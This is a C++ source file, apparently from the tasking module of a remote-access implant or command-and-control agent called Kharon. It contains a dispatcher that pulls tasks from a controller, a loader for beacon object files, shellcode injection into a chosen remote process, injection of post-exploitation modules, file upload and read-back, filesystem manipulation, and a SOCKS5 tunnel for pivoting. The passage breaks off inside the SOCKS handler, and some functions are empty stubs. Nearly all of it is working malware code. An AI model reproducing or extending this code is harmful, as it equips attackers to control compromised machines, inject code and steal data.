#include <Kharon.h>

using namespace Root;

#define MAX_SOCKET_DATA_SIZE (1024 * 1024)
#define max(a,b) (((a) > (b)) ? (a) : (b))

auto DECLFN Task::Dispatcher(VOID) -> VOID {
    KhDbg("[====== Starting Dispatcher ======]");
    KhDbg("Initial heap allocation count: %d", Self->Hp->Count);

    PACKAGE* Package  = nullptr;
    PARSER*  Parser   = nullptr;
    PVOID    DataPsr  = nullptr;
    UINT64   PsrLen   = 0;
    PCHAR    TaskUUID = nullptr;
    BYTE     JobID    = 0;
    ULONG    TaskQtt  = 0;

    Self->Jbs->PostJobs = Self->Pkg->PostJobs();
    Package  = Self->Pkg->NewTask();
    if ( ! Package ) {
        KhDbg("ERROR: Failed to create new task package");
        goto CLEANUP;
    }

    Parser = (PARSER*)hAlloc( sizeof(PARSER) );
    if ( ! Parser ) {
        KhDbg("ERROR: Failed to allocate parser memory");
        goto CLEANUP;
    }

    Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
    
    if (!DataPsr || !PsrLen) {
        KhDbg("ERROR: No data received or zero length");
        goto CLEANUP;
    }
    KhDbg("Received response %p [%d bytes]", DataPsr, PsrLen);

    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
    if ( ! Parser->Original ) { goto CLEANUP; }

    KhDbg("Parsed data %p [%d bytes]", Parser->Buffer, Parser->Length);

    JobID = Self->Psr->Byte( Parser );

    if ( JobID == Enm::Task::GetTask ) {
        KhDbg("Processing job ID: %d", JobID);
        TaskQtt = Self->Psr->Int32( Parser );
        KhDbg("Task quantity received: %d", TaskQtt);

        if ( TaskQtt > 0 ) {
            if ( !Self->Jbs->PostJobs ) {
                KhDbg("ERROR: Failed to create post jobs package");
                goto CLEANUP;
            }
 
            Self->Pkg->Int32( Self->Jbs->PostJobs, TaskQtt );

            for ( ULONG i = 0; i < TaskQtt; i++ ) {
                TaskUUID = Self->Psr->Str( Parser, 0 );
                if ( !TaskUUID ) {
                    KhDbg("WARNING: Invalid TaskUUID at index %d", i);
                    continue;
                }

                KhDbg("Creating job for task UUID: %s", TaskUUID);
                KhDbg(
                    "Parser state: %p, buffer: %p, length: %d", 
                    Parser, Parser->Buffer, Parser->Length
                );

                JOBS* NewJob = Self->Jbs->Create( TaskUUID, Parser );
                if ( ! NewJob ) {
                    KhDbg("WARNING: Failed to create job for task %d", i);
                    continue;
                }
            }
        }
    }

    if ( Self->Jbs->ExecuteAll() ) {
        Self->Jbs->Send( Self->Jbs->PostJobs );
    }

CLEANUP:
    Self->Jbs->Cleanup();

    if ( DataPsr ) {
        hFree( DataPsr );
    }

    if ( Parser ) { 
        Self->Psr->Destroy( Parser );
    }

    if ( Self->Jbs->PostJobs ) {
        Self->Pkg->Destroy( Self->Jbs->PostJobs );
    }

    if ( Package ) {
        Self->Pkg->Destroy( Package );
    }

    KhDbg("Final heap allocation count: %d", Self->Hp->Count);
    KhDbg("[====== Dispatcher Finished ======]\n");
}

auto DECLFN Task::ExecBof(
    _In_ JOBS* Job
) -> ERROR_CODE {
    BOOL Success = FALSE;

    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    G_PACKAGE = Package;
    G_PARSER  = Parser;

    ULONG BofLen   = 0;
    BYTE* BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
    ULONG BofCmdID = Self->Psr->Int32( Parser );
    ULONG BofArgc  = 0;
    BYTE* BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );

    KhDbg("bof id  : %d", BofCmdID);
    KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);

    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );

    G_PACKAGE = nullptr;
    G_PARSER  = nullptr;

    if ( Success ) {
        return KhRetSuccess;
    } else {
        return KhGetError;
    }
}

auto DECLFN Task::Download(
    _In_ JOBS* Job
) -> ERROR_CODE {

}

auto DECLFN Task::Upload(_In_ JOBS* Job) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;
    
    CHAR* FileID   = nullptr;
    CHAR* FilePath = nullptr;
    INT8  Index    = -1;

    ULONG UploadState = Self->Psr->Int32( Parser );

    KhDbg("Upload state: %d", UploadState);

    switch ( UploadState ) {
        case Enm::Up::Init: {
            FileID = Self->Psr->Str( Parser, 0 );
            KhDbg("file id: %s", FileID);
            for (INT i = 0; i < 10; i++) {
                if ( ! Self->Tsp->Up[i].FileID || ! Str::LengthA( Self->Tsp->Up[i].FileID ) ) {
                    Index = i; break;
                }
            }

            KhDbg("index: %d", Index);

            if (Index == -1) {
                CHAR* ErrorMsg = "Maximum concurrent uploads (10) reached";
                KhDbg("%s", ErrorMsg);
                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                return KhRetSuccess;
            }

            FilePath = Self->Psr->Str(Parser, 0);

            KhDbg("file path: %s", FilePath);

            Self->Tsp->Up[Index].FileID = FileID;
            Self->Tsp->Up[Index].Path   = FilePath;
            Self->Tsp->Up[Index].CurChunk = 0;
            Self->Tsp->Up[Index].BytesReceived = 0;
            Self->Tsp->Up[Index].TotalChunks = 0; 

            Self->Pkg->Int32( Package, 1 ); // Start with chunk 1
            Self->Pkg->Str( Package, FileID );
            Self->Pkg->Str( Package, FilePath );
            Self->Pkg->Int32( Package, KH_CHUNK_SIZE );

            KhDbg("Init upload: ID=%s, Path=%s", FileID, FilePath);

            break;
        }
        case Enm::Up::Chunk: {
            FileID = Self->Psr->Str(Parser, 0);
            if (!FileID) {
                CHAR* ErrorMsg = "Invalid File ID";
                KhDbg("%s", ErrorMsg);
                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                return KhRetSuccess;
            }

            INT TotalChunks = Self->Psr->Int32(Parser);
            INT ChunkNumber = Self->Psr->Int32(Parser);
            INT ChunkSize = Self->Psr->Int32(Parser);
            BYTE* ChunkData = Self->Psr->Bytes(Parser, 0);

            KhDbg("total: %d", TotalChunks);
            KhDbg("chunk number: %d", ChunkNumber);
            KhDbg("chunk size: %d", ChunkSize);
            KhDbg("chunk data: %p", ChunkData); 

            INT FileIndex = -1;
            for (INT i = 0; i < 10; i++) {
                if (Self->Tsp->Up[i].FileID && Str::CompareA(FileID, Self->Tsp->Up[i].FileID) == 0) {
                    FileIndex = i;
                    break;
                }
            }

            if (FileIndex == -1) {
                CHAR* ErrorMsg = "File ID not found";
                KhDbg("%s", ErrorMsg);
                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                return KhRetSuccess;
            }

            if (
                ! Self->Tsp->Up[FileIndex].FileHandle || 
                Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE
            ) {
                Self->Tsp->Up[FileIndex].FileHandle = Self->Krnl32.CreateFileA(
                    Self->Tsp->Up[FileIndex].Path, FILE_APPEND_DATA,
                    FILE_SHARE_READ, nullptr, OPEN_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, nullptr
                );

                if (Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE) {
                    CHAR* ErrorMsg = "Failed to create/open file";
                    KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                    Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                    return KhRetSuccess;
                }
            }

            Self->Krnl32.SetFilePointer(
                Self->Tsp->Up[FileIndex].FileHandle,
                0, nullptr, FILE_END
            );

            DWORD bytesWritten;
            BOOL writeResult = Self->Krnl32.WriteFile(
                Self->Tsp->Up[FileIndex].FileHandle,
                ChunkData, ChunkSize, &bytesWritten, nullptr
            );

            if (!writeResult || bytesWritten != ChunkSize) {
                CHAR* ErrorMsg = "Failed to write chunk to file";
                KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                
                if (Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE) {
                    Self->Ntdll.NtClose(Self->Tsp->Up[FileIndex].FileHandle);
                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
                }
                
                return KhRetSuccess;
            }

            Self->Tsp->Up[FileIndex].CurChunk = ChunkNumber;
            Self->Tsp->Up[FileIndex].BytesReceived += bytesWritten;
            Self->Tsp->Up[FileIndex].TotalChunks = TotalChunks;

            KhDbg("Chunk %d/%d (%d bytes) written to %s", 
                ChunkNumber, TotalChunks, bytesWritten, FileID);

            if ( ChunkNumber == TotalChunks || ChunkSize < KH_CHUNK_SIZE ) {
                KhDbg("Upload completed: %s (%d bytes total)", 
                    FileID, Self->Tsp->Up[FileIndex].BytesReceived);

                if (Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE) {
                    Self->Ntdll.NtClose(Self->Tsp->Up[FileIndex].FileHandle);
                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
                }

                if (Self->Tsp->Up[FileIndex].FileID) {
                    hFree(Self->Tsp->Up[FileIndex].FileID);
                    Self->Tsp->Up[FileIndex].FileID = nullptr;
                }
                
                if (Self->Tsp->Up[FileIndex].Path) {
                    hFree(Self->Tsp->Up[FileIndex].Path);
                    Self->Tsp->Up[FileIndex].Path = nullptr;
                }

                Self->Tsp->Up[FileIndex].CurChunk = 0;
                Self->Tsp->Up[FileIndex].BytesReceived = 0;
                Self->Tsp->Up[FileIndex].TotalChunks = 0;
            }

            break;
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::ScInject(
    _In_ JOBS* Job
) -> ERROR_CODE {
    KhDbg("dbg");
    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;

    ULONG    Length    = 0;
    BYTE*    Buffer    = Self->Psr->Bytes( Parser, &Length );
    ULONG    ProcessId = Self->Psr->Int32( Parser );
    INJ_OBJ* Object    = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );

    Object->ProcessId = ProcessId;

    if ( ! Self->Inj->Standard( Buffer, Length, nullptr, 0, Job->UUID, Object ) ) {
        Self->Pkg->SendMsg( Job->UUID, "Failed to inject into remote process", CALLBACK_ERROR );
        return KhGetError;
    }

    hFree( Object );

    return KhRetSuccess;
}

auto DECLFN Task::PostEx(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;
    CHAR*    DefUUID = Job->UUID;

    HANDLE   ReadPipe     = INVALID_HANDLE_VALUE;
    HANDLE   WritePipe    = INVALID_HANDLE_VALUE;
    HANDLE   BackupHandle = INVALID_HANDLE_VALUE;
    HANDLE   PipeHandle   = INVALID_HANDLE_VALUE;

    INJ_OBJ* Object = nullptr;

    PROCESS_INFORMATION PsInfo = { 0 };

    BYTE* Output = nullptr;

    ULONG Method  = Self->Psr->Int32( Parser );
    ULONG Length  = 0;
    BYTE* Buffer  = Self->Psr->Bytes( Parser, &Length );
    ULONG ArgLen  = 0;
    BYTE* ArgBuff = Self->Psr->Bytes( Parser, &ArgLen );

    Object = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );

    auto CleanupAndReturn = [&]( ERROR_CODE ErrorCode = KhGetError ) -> ERROR_CODE {
        if ( Output )      hFree( Output );
        if ( PipeHandle   != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( PipeHandle );
        if ( WritePipe    != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( WritePipe );
        if ( ReadPipe     != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ReadPipe );
        if ( BackupHandle != INVALID_HANDLE_VALUE ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupHandle );
        if ( PsInfo.hProcess ) {
            Self->Krnl32.TerminateProcess( PsInfo.hProcess, EXIT_SUCCESS );
            if ( PsInfo.hProcess ) Self->Ntdll.NtClose( PsInfo.hProcess );
            if ( PsInfo.hThread  ) Self->Ntdll.NtClose( PsInfo.hThread  );
        }
        if ( Object ) {
            if ( Object->BaseAddress  ) Self->Mm->Free( Object->BaseAddress, Length + ArgLen, MEM_RELEASE, Object->PsHandle );
            if ( Object->ThreadHandle ) Self->Ntdll.NtClose( Object->ThreadHandle );
            
            hFree( Object );
        } 
        
        return ErrorCode;
    };

    if ( Method == Enm::PostXpl::Inline ) {
        SECURITY_ATTRIBUTES SecAttr = { 
            .nLength = sizeof(SECURITY_ATTRIBUTES), 
            .lpSecurityDescriptor = nullptr,
            .bInheritHandle = TRUE
        };

        if ( ! Self->Krnl32.CreatePipe( &ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH ) ) {
            QuickErr( "Failed to create pipe" );
            return CleanupAndReturn();
        }

        BackupHandle = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
        Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, WritePipe );

        Object->PsHandle = NtCurrentProcess();
        Object->Persist  = TRUE;

        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
            QuickErr( "Failed to inject post-ex module");
            return CleanupAndReturn();
        }

        Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, INFINITE );

        Self->Ntdll.NtClose( WritePipe );
        WritePipe = INVALID_HANDLE_VALUE;

        ULONG BytesAvail = 0;
        if ( Self->Krnl32.PeekNamedPipe( ReadPipe, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
            Output = (BYTE*)hAlloc( BytesAvail );
            if ( Output ) {
                ULONG BytesRead = 0;
                if ( Self->Krnl32.ReadFile( ReadPipe, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
                    QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
                }
            }
        }

    // todo: make the fork and run option

    // } else if ( Method == Enm::PostXpl::Fork ) { 
    //     Self->Ps->Ctx.Pipe = FALSE;

    //     if ( ! Self->Ps->Create( "C:\\Windows\\System32\\cmd.exe", TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &PsInfo ) ) {
    //         QuickErr( "Failed in process creation: %d", KhGetError );
    //         return CleanupAndReturn( KhGetError );
    //     }

    //     Self->Krnl32.ResumeThread( PsInfo.hThread );

    //     KhDbg( "postex module running at pid %d tid %d", PsInfo.dwProcessId, PsInfo.dwThreadId );
    //     KhDbg( "postex module running at ph %d th %d", PsInfo.hProcess, PsInfo.hThread );

    //     Self->Ps->Ctx.Pipe = TRUE;

    //     Object->Persist   = TRUE;
    //     Object->ProcessId = PsInfo.dwProcessId;
    //     Object->PsHandle  = PsInfo.hProcess;

    //     if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
    //         QuickErr( "Injection failed in fork mode\n" );
    //         return CleanupAndReturn( KhGetError );
    //     }

    //     for (int i = 0; i < 10; i++) {
    //         if ( Self->Krnl32.WaitNamedPipeA( KH_FORK_PIPE_NAME, 5000 ) ) {
    //             break;
    //         }
    //         if (i == 9) {
    //             QuickErr("Pipe timeout\n");
    //         }
    //     }

    //     for (int i = 0; i < 10; i++) {
    //         PipeHandle = Self->Krnl32.CreateFileA(
    //             KH_FORK_PIPE_NAME,GENERIC_READ,
    //             0, NULL, OPEN_EXISTING, 0, NULL
    //         );
    //         if ( PipeHandle != INVALID_HANDLE_VALUE ) {
    //             break;
    //         }
            
    //         Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, 500 );
            
    //         if (i == 9) {
    //             KhDbg("Failed to connect to named pipe");
    //             return CleanupAndReturn(ERROR_TIMEOUT);
    //         }
    //     }

    //     ULONG BytesAvail = 0;
    //     if ( Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
    //         Output = (BYTE*)hAlloc( BytesAvail );
    //         if ( Output ) {
    //             ULONG BytesRead = 0;
    //             if ( Self->Krnl32.ReadFile( PipeHandle, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
    //                 QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
    //             }
    //         }
    //     }
    }

    return CleanupAndReturn( ERROR_SUCCESS );
}


auto DECLFN Task::FileSystem(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8    SbCommandID  = Self->Psr->Byte( Parser );

    ULONG    TmpVal  = 0;
    BOOL     Success = TRUE;
    BYTE*    Buffer  = { 0 };

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );
    
    switch ( SbCommandID ) {
        case Enm::Fs::ListFl: {
            WIN32_FIND_DATAA FindData     = { 0 };
            SYSTEMTIME       CreationTime = { 0 };
            SYSTEMTIME       AccessTime   = { 0 };
            SYSTEMTIME       WriteTime    = { 0 };

            CHAR   FullPath[MAX_PATH];
            HANDLE FileHandle = nullptr;
            ULONG  FileSize   = 0;
            PCHAR  TargetDir  = Self->Psr->Str( Parser, &TmpVal );
            HANDLE FindHandle = Self->Krnl32.FindFirstFileA( TargetDir, &FindData );

            if ( FindHandle == INVALID_HANDLE_VALUE || !FindHandle ) break;

            Self->Krnl32.GetFullPathNameA( FindData.cFileName, MAX_PATH, FullPath, nullptr );

            Self->Pkg->Str( Package, FullPath );
        
            do {
                FileHandle = Self->Krnl32.CreateFileA( FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
                FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
                
                Self->Ntdll.NtClose( FileHandle );

                Self->Pkg->Str( Package, FindData.cFileName );
                Self->Pkg->Int32( Package, FileSize );
                Self->Pkg->Int32( Package, FindData.dwFileAttributes );
        
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftCreationTime, &CreationTime );

                Self->Pkg->Int16( Package, CreationTime.wDay    );
                Self->Pkg->Int16( Package, CreationTime.wMonth  );
                Self->Pkg->Int16( Package, CreationTime.wYear   );
                Self->Pkg->Int16( Package, CreationTime.wHour   );
                Self->Pkg->Int16( Package, CreationTime.wMinute );
                Self->Pkg->Int16( Package, CreationTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &AccessTime );

                Self->Pkg->Int16( Package, AccessTime.wDay    );
                Self->Pkg->Int16( Package, AccessTime.wMonth  );
                Self->Pkg->Int16( Package, AccessTime.wYear   );
                Self->Pkg->Int16( Package, AccessTime.wHour   );
                Self->Pkg->Int16( Package, AccessTime.wMinute );
                Self->Pkg->Int16( Package, AccessTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastWriteTime, &WriteTime );

                Self->Pkg->Int16( Package, WriteTime.wDay    );
                Self->Pkg->Int16( Package, WriteTime.wMonth  );
                Self->Pkg->Int16( Package, WriteTime.wYear   );
                Self->Pkg->Int16( Package, WriteTime.wHour   );
                Self->Pkg->Int16( Package, WriteTime.wMinute );
                Self->Pkg->Int16( Package, WriteTime.wSecond );
        
            } while ( Self->Krnl32.FindNextFileA( FindHandle, &FindData ));
        
            Success = Self->Krnl32.FindClose( FindHandle );

            break;
        }
        case Enm::Fs::Cwd: {
            CHAR CurDir[MAX_PATH] = { 0 };

            Self->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 

            Self->Pkg->Str( Package, CurDir );

            break;
        }
        case Enm::Fs::Move: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.MoveFileA( SrcFile, DstFile ); 

            break;
        }
        case Enm::Fs::Copy: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );

            break;
        }
        case Enm::Fs::MakeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CreateDirectoryA( PathName, NULL );
            
            break;
        }
        case Enm::Fs::Delete: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.DeleteFileA( PathName );

            break;
        }
        case Enm::Fs::ChangeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.SetCurrentDirectoryA( PathName );

            break;
        }
        case Enm::Fs::Read: {
            PCHAR  PathName   = Self->Psr->Str( Parser, 0 );
            ULONG  FileSize   = 0;
            BYTE*  FileBuffer = { 0 };
            HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
            if (FileHandle == INVALID_HANDLE_VALUE) 
            {
                break;
            }
            FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
            FileBuffer = B_PTR( hAlloc( FileSize ) );

            Success = Self->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );
            Self->Ntdll.NtClose( FileHandle );
            Buffer = FileBuffer;
            TmpVal = FileSize; 

            Self->Pkg->Bytes( Package, Buffer, TmpVal );

            break;
        }
    }

_KH_END:
    if ( !Success ) { return KhGetError; }
    if ( SbCommandID != Enm::Fs::ListFl || SbCommandID != Enm::Fs::Read || SbCommandID != Enm::Fs::Cwd ) {
        Self->Pkg->Int32( Package, Success );
    }

    if ( Buffer ) { hFree( Buffer ); }

    return KhRetSuccess;
}

auto DECLFN Task::Pivot(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubCmd = Self->Psr->Byte( Parser );

    KhDbg( "sub command id: %d", SubCmd );

    Self->Pkg->Byte( Package, SubCmd );    

    switch ( SubCmd ) {
        case Enm::Pivot::List: {

        }
        case Enm::Pivot::Link: {

        }
        case Enm::Pivot::Unlink: {

        }
    }
}

unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size);
auto DECLFN Task::Socks(
    _In_ JOBS* Job
) -> ERROR_CODE {
    KhDbg("SOCKS task started");

    PACKAGE* Pkg = Job->Pkg;
    PARSER*  Psr = Job->Psr;

    BOOL IsExit = Self->Psr->Int32(Psr);
    ULONG ServerID = Self->Psr->Int32(Psr);

    ULONG b64Len = 0;
    BYTE* b64Data = nullptr;
    ULONG dataLen = 0;
    BYTE* data = nullptr;

    if (!IsExit) {
        b64Data = Self->Psr->Bytes(Psr, &b64Len);
        if (b64Data && b64Len) {
            dataLen = Self->Pkg->Base64DecSize((PCHAR)b64Data);
            data = (BYTE*)hAlloc(dataLen);
            if (!data) {
                KhDbg("malloc fail");
                return ERROR_OUTOFMEMORY;
            }
            base64_decode((PCHAR)b64Data, (PUCHAR)data, dataLen);
        }
    }

    KhDbg("ServerID: %u, IsExit: %d", ServerID, IsExit);

    BYTE* respData = nullptr;
    ULONG respLen = 0;
    ERROR_CODE Result = ERROR_SUCCESS;

    ULONG operation;
    if (IsExit) {
        operation = KH_SOCKET_CLOSE;
        KhDbg("Operation: close socket");
    }
    else if (Self->Skt->Exist(ServerID)) {
        operation = KH_SOCKET_DATA;
        KhDbg("Operation: data for existing socket");
    }
    else {
        operation = KH_SOCKET_NEW;
        KhDbg("Operation: new socket");
    }

    if (data && dataLen)
        Self->Skt->LogData("received", data, dataLen);

    switch (operation) {
    case KH_SOCKET_NEW: {
        SOCKET newSock = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (newSock == INVALID_SOCKET) {
            DWORD err = KhGetError;
            KhDbg("socket() fail: 0x%X", err);
            Result = err;
            break;
        }
        KhDbg("socket created: %llu", (ULONG64)newSock);

        BOOL isTLS = (dataLen > 0 && data[0] == 0x16);
        ULONG targetIP = 0;
        USHORT targetPort = 0;
        ULONG hdrSize = 0;

        if (!isTLS) {
            if (dataLen < 10) {
                KhDbg("invalid SOCKS5 header size");
                Self->Ws2_32.closesocket(newSock);
                Result = ERROR_INVALID_DATA;
                break;
            }

            if (data[0] != 0x05) {
                KhDbg("invalid SOCKS version 0x%02X", data[0]);
                Self->Ws2_32.closesocket(newSock);
                Result = ERROR_INVALID_DATA;
                break;
            }

            switch (data[3]) {
            case 0x01: { // IPv4
                if (dataLen < 10) {
                    KhDbg("incomplete IPv4 data");
                    Self->Ws2_32.closesocket(newSock);
                    Result = ERROR_INVALID_DATA;
                    break;
                }
                Mem::Copy(&targetIP, data + 4, sizeof(ULONG));
                Mem::Copy(&targetPort, data + 8, sizeof(USHORT));
                hdrSize = 10;
                KhDbg("connecting to IPv4 %d.%d.%d.%d:%d", data[4], data[5], data[6], data[7], Self->Ws2_32.ntohs(targetPort));
                break;
            }
            case 0x03: { // Domain
                if (dataLen < 5) {
                    KhDbg("incomplete domain data");
                    Self->Ws2_32.closesocket(newSock);
                    Result = ERROR_INVALID_DATA;
                    break;
                }
                UCHAR domLen = data[4];
                hdrSize = 5 + domLen + 2;
                if (dataLen < hdrSize) {
                    KhDbg("domain data incomplete size %u expected %u", dataLen, hdrSize);
                    Self->Ws2_32.closesocket(newSock);
                    Result = ERROR_INVALID_DATA;
                    break;
                }
                CHAR domain[MAX_PATH] = { 0 };
                Mem::Copy(domain, data + 5, domLen);
                addrinfo hints = { 0 };
                hints.ai_family = AF_INET;
                hints.ai_socktype = SOCK_STREAM;
                addrinfo* res = nullptr;
                if (Self->Ws2_32.getaddrinfo(domain, nullptr, &hints, &res) != 0) {
                    KhDbg("getaddrinfo fail for %s", domain);
                    Self->Ws2_32.closesocket(newSock);
                    Result = ERROR_NOT_FOUND;
                    break;
                }
                targetIP = ((sockaddr_in*)res->ai_addr)->sin_addr.s_addr;
                Mem::Copy(&targetPort, data + 5 + domLen, sizeof(USHORT));
                Self->Ws2_32.freeaddrinfo(res);
                KhDbg("connecting to domain %s:%d", domain, Self->Ws2_32.ntohs(targetPort));
                break;
            }
            default:
                KhDbg("unsupported address type 0x%02X", data[3]);
                Self->Ws2_32.closesocket(newSock);
                Result = ERROR_NOT_SUPPORTED;
                break;
            }

            if (Result != ERROR_SUCCESS)
                break;
        }
        else {
            Mem::Copy(&targetIP, data + 4, sizeof(ULONG));
            Mem::Copy(&targetPort, data + 8, sizeof(USHORT));
            hdrSize = 0;
        }

        sockaddr_in dstAddr = { 0 };
        dstAddr.sin_family = AF_INET;
        dstAddr.sin_addr.s_addr = targetIP;
        dstAddr.sin_port = targetPort;

        BOOL noDelay = TRUE;
        Self->Ws2_32.setsockopt(newSock, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay));

        KhDbg("connecting socket to target");
        if (Self->Ws2_32.connect(newSock, (sockaddr*)&dstAddr, sizeof(dstAddr)) == SOCKET_ERROR) {
            DWORD err = KhGetError;
            KhDbg("connect fail: 0x%X", err);
            Self->Ws2_32.closesocket(newSock);
            Result = err;
            break;
        }

        KhDbg("connected successfully");

        if (!isTLS) {
            BYTE socksResp[10] = { 0x05,0x00,0x00,0x01,0,0,0,0,0,0 };
            respData = (BYTE*)hAlloc(sizeof(socksResp));
            if (!respData) {
                KhDbg("malloc fail for response");
                Self->Ws2_32.closesocket(newSock);
                Result = ERROR_OUTOFMEMORY;
                break;
            }
            Mem::Copy(respData, socksResp, sizeof(socksResp));
            respLen = sizeof(socksResp);
        }

        ERROR_CODE err = Self->Skt->Add(ServerID, newSock);
        if (err != ERROR_SUCCESS) {
            KhDbg("Skt->Add fail 0x%X", err);
            if (respData) hFree(respData);
            Self->Ws2_32.closesocket(newSock);
            Result = err;
            break;
        }

        if (dataLen > (isTLS ? 0 : hdrSize)) {
            ULONG offset = isTLS ? 0 : hdrSize;
            ULONG sendSz = dataLen - offset;
            if (sendSz) {
                KhDbg("sending initial %u bytes", sendSz);
                int sent = Self->Ws2_32.send(newSock, (char*)(data + offset), sendSz, 0);
                if (sent == SOCKET_ERROR) {
                    DWORD serr = KhGetError;
                    KhDbg("send error 0x%X (continue)", serr);
                    Result = serr;
                }
                else {
                    KhDbg("sent %d bytes", sent);
                }
            }
        }
        break;
    }
    case KH_SOCKET_DATA: {
        KhDbg("SOCKET_DATA processing for ServerID %u", ServerID);

        SOCKET ActiveSock = Self->Skt->Get(ServerID);
        if (ActiveSock == INVALID_SOCKET) {
            KhDbg("Socket not found for ServerID %u", ServerID);
            Result = ERROR_NOT_FOUND;
            break;
        }

        if (dataLen > 0) {
            Self->Skt->LogData("sending to target", data, dataLen);

            INT32 BytesSent = Self->Ws2_32.send(ActiveSock, (CHAR*)data, dataLen, 0);
            if (BytesSent == SOCKET_ERROR) {
                KhDbg("send failed with error: %d", Self->Ws2_32.WSAGetLastError());
                break;
            }

            ULONG BuffRecvLen = max(0x1000, dataLen * 2);
            BYTE* BuffRecv = (BYTE*)hAlloc(BuffRecvLen);
            if (!BuffRecv) {
                KhDbg("malloc fail for buffer");
                break;
            }

            ULONG TotalRead = 0;

            while (true) {
                ULONG DataAvail = 0;
                if (Self->Ws2_32.ioctlsocket(ActiveSock, FIONREAD, &DataAvail) != 0 || DataAvail == 0)
                    break;

                if ((TotalRead + DataAvail) > BuffRecvLen) {
                    ULONG NewLen = BuffRecvLen * 2;
                    BYTE* NewBuff = (BYTE*)hReAlloc(BuffRecv, NewLen);
                    if (!NewBuff) {
                        KhDbg("realloc fail");
                        break;
                    }
                    BuffRecv = NewBuff;
                    BuffRecvLen = NewLen;
                }

                ULONG DataRead = 0;
                if (!Self->Skt->RecvAll(ActiveSock, BuffRecv + TotalRead, min(DataAvail, BuffRecvLen - TotalRead), &DataRead)) {
